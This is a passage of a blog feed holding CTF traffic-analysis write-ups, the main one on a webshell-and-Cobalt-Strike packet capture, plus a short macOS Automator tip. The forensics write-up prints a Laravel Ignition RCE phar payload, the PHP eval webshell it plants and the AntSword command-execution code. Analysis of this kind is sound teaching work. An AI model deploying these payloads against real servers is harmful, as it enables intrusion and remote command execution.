&#123;</span><br><span class="line">print(@fgets($io[2],2048));</span><br><span class="line">&#125;</span><br><span class="line">@fclose($io[1]);</span><br><span class="line">@fclose($io[2]);</span><br><span class="line">@proc_close($p);</span><br><span class="line">&#125; elseif(fe(&#39;antsystem&#39;)) &#123;</span><br><span class="line">@antsystem($c);</span><br><span class="line">&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class="line">return $ret;</span><br><span class="line">&#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class="line">$w&#x3D;new COM(&#39;WScript.shell&#39;);</span><br><span class="line">$e&#x3D;$w-&gt;exec($c);</span><br><span class="line">$so&#x3D;$e-&gt;StdOut();</span><br><span class="line">$ret.&#x3D;$so-&gt;ReadAll();</span><br><span class="line">$se&#x3D;$e-&gt;StdErr();</span><br><span class="line">$ret.&#x3D;$se-&gt;ReadAll();</span><br><span class="line">print($ret);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$ret &#x3D; 127;</span><br><span class="line">&#125;</span><br><span class="line">return $ret;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>We can see that parameter s receive  parameter ufbd335828f30f’s value.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br></pre></td></tr></table></figure><p>so, s=</p><figure class="highlight plain"><figcaption><span>/d "D:\\phpstudy_pro\\WWW\\secret"&"C:\Program Files\7-Zip\7z.exe" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>The password was found,P4Uk6qkh6Gvqwg3y.Then extract beacon_keys file.We can recover serialized private key by  <a href="https://github.com/WBGlIl/CS_Decrypt">https://github.com/WBGlIl/CS_Decrypt</a>.</p><p><img src="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim" alt="paste image"></p><p>From RSA key we can recover AES key in traffic ,usually the encryped data located in cookie field.</p><p><img src="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim" alt="paste image"><img src="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim" alt="paste image"></p><p>From AES key we can recover totally communication contents,according to cobalt strike traffic characetristics,we can get beacon’s task execution results from the pacakage which POST DATA to submit.php?id=xxx.</p><p><img src="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim" alt="paste image"></p><p>Note that data should be base64 format,then use script decode it.</p><p><img src="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim" alt="paste image"></p><p>So beacon’s task execution result were shown in above figure, it contains the flag what we want.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_43264813/article/details/120560209">https://blog.csdn.net/qq_43264813/article/details/120560209</a></p><p><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan">https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan</a></p><p><a href="https://www.wkr.moe/ctf/610.html#toc-head-3">https://www.wkr.moe/ctf/610.html#toc-head-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Quick start  Captfencoder in Mac</title>
      <link href="2021/10/08/Quick-start-Captfencoder-in-Mac/"/>
      <url>2021/10/08/Quick-start-Captfencoder-in-Mac/</url>
      
        <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>Automator in mac<br>open automator,choose application,search shell on the top<br><img src="http://cdn.polowong.top/1633678583273wpowfu9o.png?imageslim" alt="paste image"><br>then type</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&#x2F;path&#x2F;to&#x2F;npm&#x2F;;cd &#x2F;path&#x2F;to&#x2F;npm&#x2F;apps ;npm start</span><br></pre></td></tr></table></figure><p>Automator doesn’t know the path of npm, so it should be exported frist.<br><img src="http://cdn.polowong.top/1633678772412ykmrga69.png?imageslim" alt="paste image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>绿城杯流量分析</title>
      <link href="2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包<img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image">在这里看到了很多ignition之类的包，百度了下这是一个laravel的RCE。后面的包一直在向.config.php post数据，怀疑config.php是写的马，跟进去看看。使用http contains config过滤出来。<img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image">很明显是webshell了，这是在执行ls<img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image">继续跟踪这个webshell的数据包，看看有无有价值的信息。<img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image">看到了一个secret.zip，但是http对象导出并没有这玩意。继续追踪看到了pk开头的一段数据，考虑是压缩包，尝试进行还原。<img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image">需要注意的是，压缩包前后有两段字符串是蚁剑自带干扰流量特征的。还原之后是个加密的压缩包，不是伪加密，下一步的目的是找到压缩包的密码。同时需要注意的是，这里文件名和cobalt strike有关（rt废物狂喜），然后搜了下.cobaltstrike.beacon_keys这个东西是干嘛的。上述文件是一个序列化后的公钥私钥文件，CS的beacon会嵌入这个文件中的公钥，当然了，私钥是留给server自己的。下一步应该是对这个文件进行解密，获取CS的通信数据。既然知道了是cobalt strike的通信流量，那么需要找到beacon与teamserver交互的数据包，但这个前提是得到私钥。获取私钥的前提是解开压缩包的密码。下面需要做的是找压缩包的密码。<img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image">继续追踪数据包，在上面的包中看到了解压的操作。但是当时我直接对传输的数据进行URL+BASE64解码，并不能得到任何有价值的信息。那么接下来需要做的是看一看传的马的内容以及加密方式。在laravel RCE的包中可以找到payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>把payload中的=00替换为空然后解base64可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">�a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~ضtest.txt\KKa~ضtesttest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��GBMB</span><br></pre></td></tr></table></figure><p>这写进去的应该是一个序列化对象，应该是和laravel的rce有关，我们重点关注传进去的内容。@eval(@gzinflate(base64_decode($_POST[14433])));所以需要做gzip和base64的解码才可以明白流量包中的具体内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>上面是对解压包的url解码，然后gzip+base64解码尝试还原代码内容,对上面的每个参数进行解密!下面这个包是解压缩的包的解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span 